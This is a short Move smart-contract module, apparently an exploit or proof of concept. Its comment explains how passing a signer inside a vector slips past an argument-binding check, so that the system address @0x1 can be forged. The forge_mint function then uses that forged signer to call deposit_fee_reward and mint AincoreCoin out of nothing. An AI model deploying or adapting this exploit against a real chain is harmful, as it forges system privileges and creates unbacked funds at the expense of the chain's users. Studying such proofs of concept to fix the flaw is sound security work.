module 0x0e1b4e0d165bed857e8a3232ee9865b7001e4e7945887e6f7d149c5807ccaf08::vsigforge {
    use 0x1::coin;
    use 0x1::staking;
    use std::vector;

    /// The signer arrives inside a vector, so the old bind_signer_args never
    /// rebinds it. A caller supplies bytes for vector<signer> = [@0x1]; move-vm
    /// builds a real &signer for @0x1, which passes deposit_fee_reward's system
    /// gate and mints AincoreCoin out of nothing.
    public entry fun forge_mint(sys: vector<signer>, to: address, amount: u128) {
        coin::deposit_fee_reward<staking::AincoreCoin>(vector::borrow(&sys, 0), to, amount);
    }
}
